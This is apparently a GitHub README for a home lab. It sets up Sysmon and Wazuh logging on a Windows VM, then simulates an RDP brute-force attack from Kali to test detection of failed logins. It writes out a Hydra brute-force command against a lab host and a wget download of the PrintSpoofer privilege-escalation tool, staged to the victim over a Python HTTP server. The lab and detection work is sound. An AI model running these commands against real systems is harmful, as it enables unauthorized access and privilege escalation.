# Attack-Simulation---Opnsense
Simulated an RDP brute-force attack from a Kali Linux machine in the DMZ targeting a segmented Windows host. Multiple failed authentication attempts (Event ID 4625) were generated and successfully detected in Wazuh using Windows Security logs and Sysmon telemetry.

First I will be installing Sysmon onto my Windows 10 virtual machine. I will be doing this because it provides deeper endpoint visibility. To download Sysmon search Sysmon and download it from the offical Microsoft website. 

<img width="357" height="273" alt="image" src="https://github.com/user-attachments/assets/ec5c63e5-3520-45d6-b4a9-fc996a2d7d32" />

Download it and we will download the olaf configuration. Navigate to github and search olaf sysmon configuration. Scroll down to the sysmonconfig.xml file. Download it as a raw file then save it. Next extract the contents of the compressed sysmon file. Then copy the path of the folder and open powershell with administrator privlages. 

<img width="1121" height="201" alt="image" src="https://github.com/user-attachments/assets/57e317f8-6e8e-4ddb-b452-6b15466a0a28" />

Enter the command seen in the photo below to finish the configuration of Sysmon on the Windows 10 virtual machine.

<img width="856" height="377" alt="image" src="https://github.com/user-attachments/assets/d7d5941e-38cf-46f5-8a1e-141d6a5524cf" />

Now we want to forward Sysmon logs to Wazuh. This is done by navigating to notepad and opening it as an administrator. Open a file in notepad then access the file by going to file system -> This PC -> Local Disk -> Program files x86 -> ossec-agent -> ossec.conf. Add the line of code shown below and save the changes.

<img width="495" height="71" alt="image" src="https://github.com/user-attachments/assets/32bab886-89ee-4fb0-bb1e-8cf9c527004e" />

Next open Powershell as an Administrator and run this command Restart-Service -Name Wazuh. Check that sysmon is collecting logs

<img width="697" height="296" alt="image" src="https://github.com/user-attachments/assets/4c0fa5e3-3ac6-4f88-99f0-4b0e37f49285" />

Now we want to inspect whether or not logs are being forwarded to Wazuh. Login to the Wazuh dashboard. Then select the agent and remove all filters as well as any intial fields. Then add these fields and search Sysmon in the search bar. Select refresh to look at the new logs

<img width="340" height="135" alt="image" src="https://github.com/user-attachments/assets/64bac079-a6e5-443a-b63f-645219c2da4c" />

<img width="1548" height="752" alt="image" src="https://github.com/user-attachments/assets/b335e170-dada-4b99-afc9-ca0ea233a73a" />

These configuartions will act like an EDR for our endpoint systems. I made this decision because IDS have become less reliable beacuse of encrypted traffic, but are still useful. Therefore, I will not only use EDR for endpoint defense, but also conifgure suricata rules for network defense.

Now I will simulate a brute force attack using Windows Remote Desktop Protocol and collecting logs of the attack. First I will collect the login credientals of a user and then peform a privlage escilation. 

To do this first opent the kali linux virtual machine. Open the terminal to enter the command sudo apt-get update && sudo apt-get upgrade -y. After it has finished downloading create a directory with the command mkdir <Directory_Name>. We will download crowbar onto the Kali Linux machine to do this enter the command sudo apt-get install -y crowbar. Cd into the /usr/share/wordlists/ directory to find the Rockyou.txt file and unzip it with gunzip.

<img width="562" height="325" alt="image" src="https://github.com/user-attachments/assets/90ad5e99-a9c2-420b-8b53-6673aca3b340" />

Then copy the rockyou.txt file to the ad-project directory. Enter the directory and use the command head -n 20 rockyou.txt > passwords.txt. Then nano the passwords.txt to add the password of the jsmith user. Next save the file and navigate to the Winodws 10 virtual machine. Search This PC -> properties -> advanced system settings -> remote -> allow remote connections to this computer -> select users. After this is done enter the command hydra -l jsmith -P passwords.txt rdp://10.200.10.10. 

<img width="630" height="346" alt="image" src="https://github.com/user-attachments/assets/e3cc7501-3cdd-4fc3-9760-602afe55a4ef" />

After the login credentials have been compromised run the command wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe -O printspoofer.exe on the Kali Linux machine to create a script for privlage escalation. After it has been downloaded on the kali linux machine start a http server with Python using the command python3 -m http.server 8000. On the Windows 10 VM enter http://10.200.30.10:8000 and download the printSpoofer.exe file. 

This confirms success and that the user system has now been comprimised. Now I will like to look at the logs generated as a result of this. Login to the Wazuh dashboard and enter the credintals. Select Modiules -> security Events and enter the number 4625(this number correlates to failed login attempts). 

<img width="1047" height="535" alt="image" src="https://github.com/user-attachments/assets/918492ba-a63c-42ea-8af2-c8db87b0f1e4" />

Open the log to see more detailed information about how the attempt.

<img width="692" height="761" alt="image" src="https://github.com/user-attachments/assets/452896e0-2d4c-4d76-9825-835f14028d49" />


<img width="820" height="698" alt="image" src="https://github.com/user-attachments/assets/4b3b2513-ff99-4177-95b1-220bc340cf32" />

<img width="1652" height="742" alt="image" src="https://github.com/user-attachments/assets/e900c466-c329-4558-b71a-7d94a9359106" />

From the information given we can see the IP address of the Kali Linux machine and the fail login attempts.
